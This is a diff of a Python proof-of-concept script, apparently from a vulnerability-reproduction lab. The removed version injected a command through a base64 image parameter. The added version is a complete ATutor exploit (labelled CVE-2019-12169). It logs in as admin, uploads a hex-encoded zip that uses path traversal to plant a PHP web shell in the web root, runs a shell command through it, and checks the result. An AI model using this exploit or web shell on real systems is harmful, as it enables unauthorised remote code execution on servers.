@@ -1,42 +1,149 @@
-import requests
+import sys, hashlib, requests
+import urllib
+requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 import time
 
-## 未执行注入之前访问注入文件名
-def check():
-    burp0_url = "http://encoder:8000/objects/thissystemhavebeenexploited1234"
-    burp0_cookies = {"PHPSESSID": "20a4eca1f4db870656270e54d8dec8ac", "_ga": "GA1.1.500274602.1586273581",
-                     "_gid": "GA1.1.150033256.1586273581"}
-    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0",
-                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-                     "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-                     "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
-    a = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
-    return a
+try:
+#settings
+	target   = "192.168.56.102/"
+	username = "admin"
+	password = "cuccs123"
+	commands = "ls > 1.txt"
 
+except IndexError:
+
+	print("- usage: %s <target> <username> <password> <command>" % sys.argv[0])
+	print("- Example: %s incidentsecurity.com admin mypassword 'whoami'" % sys.argv[0])
+
+	sys.exit()
+
+# headers to upload zip
+headers = {
+    "Accept-Encoding": "gzip, deflate",
+    "Referer": "http://" + target + "/mods/_core/languages/language_import.php",
+    "Connection": "close",
+    "Content-Type": "multipart/form-data; boundary=---------------------------CVE201912169",
+}
+
+# php file payload
+data = ""
+data += "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d"
+data += "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x43"
+data += "\x56\x45\x32\x30\x31\x39\x31\x32\x31\x36\x39\x0d\x0a\x43\x6f"
+data += "\x6e\x74\x65\x6e\x74\x2d\x44\x69\x73\x70\x6f\x73\x69\x74\x69"
+data += "\x6f\x6e\x3a\x20\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61\x3b\x20"
+data += "\x6e\x61\x6d\x65\x3d\x22\x66\x69\x6c\x65\x22\x3b\x20\x66\x69"
+data += "\x6c\x65\x6e\x61\x6d\x65\x3d\x22\x70\x6f\x63\x2e\x7a\x69\x70"
+data += "\x22\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65"
+data += "\x3a\x20\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x7a"
+data += "\x69\x70\x0d\x0a\x0d\x0a\x50\x4b\x03\x04\x14\x00\x00\x00\x08"
+data += "\x00\xa4\x00\xb8\x4e\xbb\xb9\x35\x2d\x6a\x00\x00\x00\x6a\x00"
+data += "\x00\x00\x2c\x00\x00\x00\x2e\x2e\x5c\x2e\x2e\x5c\x2e\x2e\x5c"
+data += "\x2e\x2e\x5c\x2e\x2e\x5c\x2e\x2e\x2f\x78\x61\x6d\x70\x70\x5c"
+data += "\x68\x74\x64\x6f\x63\x73\x5c\x6c\x69\x71\x75\x69\x64\x73\x6b"
+data += "\x79\x2e\x70\x68\x70\xb3\xb1\x2f\xc8\x28\x50\x48\x2d\x4b\xcc"
+data += "\xd1\x50\xb2\xb7\x53\xd2\x4b\x4a\x2c\x4e\x35\x33\x89\x4f\x49"
+data += "\x4d\xce\x4f\x49\xd5\x50\x72\x09\xcc\xf7\x02\x62\x8b\x00\x63"
+data += "\xa7\xfc\x64\x67\xa7\x9c\x48\xa3\x8c\x32\x4f\x0f\xa7\x8c\x64"
+data += "\x63\x3f\x83\x44\x0f\x2f\x43\x6f\xe7\xa0\xb4\x20\x83\xb0\xd0"
+data += "\xf0\xca\x94\xe2\xc8\x70\xd3\xbc\x94\x70\xb7\xbc\xa8\xe0\x94"
+data += "\x14\xef\x90\xe2\xf4\x80\x2a\x13\x3f\xe7\x74\x5b\x5b\x25\x4d"
+data += "\x4d\x6b\x05\x7b\x3b\x00\x50\x4b\x03\x04\x14\x00\x00\x00\x08"
+data += "\x00\xa4\x00\xb8\x4e\xbb\xb9\x35\x2d\x6a\x00\x00\x00\x6a\x00"
+data += "\x00\x00\x2c\x00\x00\x00\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f"
+data += "\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x76\x61\x72\x2f\x77\x77"
+data += "\x77\x2f\x68\x74\x6d\x6c\x2f\x6c\x69\x71\x75\x69\x64\x73\x6b"
+data += "\x79\x2e\x70\x68\x70\xb3\xb1\x2f\xc8\x28\x50\x48\x2d\x4b\xcc"
+data += "\xd1\x50\xb2\xb7\x53\xd2\x4b\x4a\x2c\x4e\x35\x33\x89\x4f\x49"
+data += "\x4d\xce\x4f\x49\xd5\x50\x72\x09\xcc\xf7\x02\x62\x8b\x00\x63"
+data += "\xa7\xfc\x64\x67\xa7\x9c\x48\xa3\x8c\x32\x4f\x0f\xa7\x8c\x64"
+data += "\x63\x3f\x83\x44\x0f\x2f\x43\x6f\xe7\xa0\xb4\x20\x83\xb0\xd0"
+data += "\xf0\xca\x94\xe2\xc8\x70\xd3\xbc\x94\x70\xb7\xbc\xa8\xe0\x94"
+data += "\x14\xef\x90\xe2\xf4\x80\x2a\x13\x3f\xe7\x74\x5b\x5b\x25\x4d"
+data += "\x4d\x6b\x05\x7b\x3b\x00\x50\x4b\x01\x02\x14\x03\x14\x00\x00"
+data += "\x00\x08\x00\xa4\x00\xb8\x4e\xbb\xb9\x35\x2d\x6a\x00\x00\x00"
+data += "\x6a\x00\x00\x00\x2c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+data += "\x00\x80\x01\x00\x00\x00\x00\x2e\x2e\x5c\x2e\x2e\x5c\x2e\x2e"
+data += "\x5c\x2e\x2e\x5c\x2e\x2e\x5c\x2e\x2e\x2f\x78\x61\x6d\x70\x70"
+data += "\x5c\x68\x74\x64\x6f\x63\x73\x5c\x6c\x69\x71\x75\x69\x64\x73"
+data += "\x6b\x79\x2e\x70\x68\x70\x50\x4b\x01\x02\x14\x03\x14\x00\x00"
+data += "\x00\x08\x00\xa4\x00\xb8\x4e\xbb\xb9\x35\x2d\x6a\x00\x00\x00"
+data += "\x6a\x00\x00\x00\x2c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+data += "\x00\x80\x01\xb4\x00\x00\x00\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e"
+data += "\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x76\x61\x72\x2f\x77"
+data += "\x77\x77\x2f\x68\x74\x6d\x6c\x2f\x6c\x69\x71\x75\x69\x64\x73"
+data += "\x6b\x79\x2e\x70\x68\x70\x50\x4b\x05\x06\x00\x00\x00\x00\x02"
+data += "\x00\x02\x00\xb4\x00\x00\x00\x68\x01\x00\x00\x00\x00\x0d\x0a"
+data += "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d"
+data += "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x43"
+data += "\x56\x45\x32\x30\x31\x39\x31\x32\x31\x36\x39\x0d\x0a\x43\x6f"
+data += "\x6e\x74\x65\x6e\x74\x2d\x44\x69\x73\x70\x6f\x73\x69\x74\x69"
+data += "\x6f\x6e\x3a\x20\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61\x3b\x20"
+data += "\x6e\x61\x6d\x65\x3d\x22\x73\x75\x62\x6d\x69\x74\x22\x0d\x0a"
+data += "\x0d\x0a\x49\x6d\x70\x6f\x72\x74\x0d\x0a\x2d\x2d\x2d\x2d\x2d"
+data += "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d"
+data += "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x43\x56\x45\x32\x30\x31"
+data += "\x39\x31\x32\x31\x36\x39\x2d\x2d\x0d\x0a"
+
+
+#reverse shell url
+shell = "http://" + target + "/liquidsky.php?language=" + commands
+
+# Generate Hash
+def gen_hash(passwd, token):
+        m= hashlib.sha1()
+        m.update(passwd.encode('utf-8') + token.encode('utf-8'))
+        return m.hexdigest()
+ 
 def poc():
-    burp0_url = "http://encoder:8000/objects/getImage.php?base64Url=YGVjaG8gMTIzIHwgdGVlIC1hIHRoaXNzeXN0ZW1oYXZlYmVlbmV4cGxvaXRlZDEyMzRg&format=jpg"
-    burp0_cookies = {"PHPSESSID": "20a4eca1f4db870656270e54d8dec8ac", "_ga": "GA1.1.500274602.1586273581",
-                     "_gid": "GA1.1.150033256.1586273581"}
-    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0",
-                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-                     "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-                     "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
-    a = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
-    return a
 
+# Run pass through SHA1
+     hash_object = hashlib.sha1(str(password).encode('utf-8'))
+     hex_dig = hash_object.hexdigest()
+   #  print("[*] Got SHA1 for pass: " + (hex_dig))
+
+     targeturl = "http://" + target + "login.php"
+     token = "abc"
+     hashed = gen_hash(hex_dig, token)
+     d = {
+         "form_password_hidden" : hashed,
+         "form_login": "admin",
+         "submit": "Login",
+         "token" : token
+     }
+     s = requests.Session()
+
+#Logging in
+     r = s.post(targeturl, data=d)
+     res = r.text
+
+# url settings, duh
+     url = "http://" + target + "mods/_core/languages/language_import.php"
+
+
+# This is "the" request to send the zip     
+     request = s.post(url, headers=headers, data=data, verify=False)
+     time.sleep(1)
+
+# Grab shell dude!
+     request = s.post(shell, verify=False)
+
+def check():
+    burp0_url = "http://" + target + "/1.txt"
+    burp0_cookies = {"_ga": "GA1.1.115988577.1589305154", "ATutorID": "3321618a2a682cdbbc4456c1c726bdbb", "flash": "no", "_gid": "GA1.1.2131281151.1591092259"}
+    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "If-Modified-Since": "Tue, 02 Jun 2020 10:06:40 GMT", "If-None-Match": "\"252-5a7171151b880-gzip\""}
+    r = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
+    return r.text
+ 
 if __name__ == "__main__":
-    time.sleep(60)
-    a1 = str(check())
-    
-    #print(a1)
-    b = poc()
-    #print(b)
-    time.sleep(5)
-    a = str(check())
-   # print(a)
-    if ('200' in a) :
-        print('PoC success!')
-    else :
-        print('PoC success!')
-
+ 
+    time.sleep(100)
+    a = check()     
+    poc()
+    aa = check()      
+    if "404" in a and "1.txt" in aa:
+          print("PoC success!")
+    else:
+          print("PoC Fail!")
+       
 
